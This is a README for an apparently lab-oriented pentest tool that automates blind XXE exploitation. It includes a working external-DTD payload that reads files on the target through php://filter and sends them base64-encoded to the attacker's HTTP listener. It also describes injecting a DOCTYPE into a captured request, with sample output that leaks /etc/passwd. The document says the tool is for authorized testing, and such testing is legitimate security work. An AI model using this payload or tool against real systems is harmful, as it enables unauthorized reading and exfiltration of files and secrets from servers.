# xxe

Interactive helper for exploiting **blind XXE via out-of-band (OOB) data exfiltration** using the classic external-DTD parameter-entity technique (`php://filter` + OOB callback).

You point it at a captured, vulnerable request and a target file path; it serves a poisoned DTD, injects the payload into the request, fires it, and prints back whatever the target read off disk.

## How it works

1. You capture a legitimate request to the vulnerable endpoint (e.g. with Burp) and save it as `xxe.req`.
2. This tool starts a local HTTP listener and a `xxe>` prompt.
3. When you type a file path at the prompt:
   - `xxe.dtd` is filled in with that file path (via `php://filter/convert.base64-encode`) and your listener's host/port, and served the next time it's requested.
   - `xxe.req`'s body is automatically weaponized — a `<!DOCTYPE>` pointing at your listener's `xxe.dtd`, plus a `&content;` reference, is injected right after the XML declaration — and the request is sent to the target.
   - The target parses the XML, fetches your `xxe.dtd`, resolves the parameter entities, reads the target file through the `php://filter` wrapper, and calls back to your listener with the base64-encoded contents.
4. The decoded content is decoded and printed in a panel.

## Requirements

- Python 3.11+
- [uv](https://docs.astral.sh/uv/) (or plain `pip`)

Dependencies (`pyproject.toml`): `requests`, `rich`.

```bash
uv sync
# or: pip install requests rich
```

## Setup

### 1. Capture the vulnerable request

In Burp (or any proxy), capture a normal, legitimate request to the vulnerable XML endpoint. Right-click → **Save item** (or **Copy to file**) to export it as a raw HTTP request, and save it as `xxe.req` in this directory.

`xxe.req` should be the **plain, unmodified request** — no `<!DOCTYPE>`, no injected entities. The tool adds the payload for you. It needs to look roughly like:

```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.65.236
Content-Type: text/plain;charset=UTF-8
...

<?xml version="1.0" encoding="UTF-8"?>
<root>
<name>asdf</name>
<tel>asdf</tel>
<email>asdf@aseds.com</email>
<message>asdf</message>
</root>
```

Requirements for auto-injection to work:
- The body must start with an XML declaration (`<?xml ... ?>`).
- The root element's opening tag must be a plain tag (not self-closing).

`xxe.req` and `*.burp*` files are gitignored — every engagement gets its own, they're never committed.

### 2. `xxe.dtd`

The DTD template already in this repo is a working blind-XXE-via-OOB payload:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={line}">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://{lhost}:{lport}/?content=%file;'>">
%oob;
```

`{line}`, `{lhost}`, and `{lport}` are filled in at runtime — `{line}` with whatever file path you type at the prompt, `{lhost}`/`{lport}` with your `-l`/`-p` CLI args. You normally don't need to touch this file unless the target needs a different DTD structure.

## Usage

```bash
uv run xxe.py -l <your-ip>
```

| Flag | Default | Description |
|------|---------|-------------|
| `-l`, `--lhost` | *(required)* | Your IP, used in the OOB callback URL — must be reachable by the target |
| `-p`, `--lport` | `8000` | Port to listen on (also what you're bound to) |
| `-r`, `--req` | `xxe.req` | Path to the raw captured request |
| `--dtd` | `xxe.dtd` | Path to the DTD template |

Once running, you get an interactive prompt:

```
xxe> /etc/passwd
Target file set: /etc/passwd
Sending request to http://10.129.65.236/blind/submitDetails.php -> 200
╭──────────────────────── Decoded Content ────────────────────────╮
│ root:x:0:0:root:/root:/bin/bash                                 │
│ ...                                                              │
╰───────────────────────────────────────────────────────────────╯
xxe> /etc/hosts
...
xxe> exit
```

Just type a file path (absolute, on the target host) and hit enter — it sets the DTD payload, fires the request, and prints whatever comes back. Type `exit` to quit.

## Notes / limitations

- Only one request is in flight at a time — the prompt blocks until the target responds.
- Some XML parsers resolve the external parameter entity twice per request; duplicate OOB callbacks within a 2-second window are deduped automatically.
- All server activity (including unexpected/stray requests) is logged to `server.log`.
- This is a manual pentest utility for use against systems you're authorized to test — not a scanner.
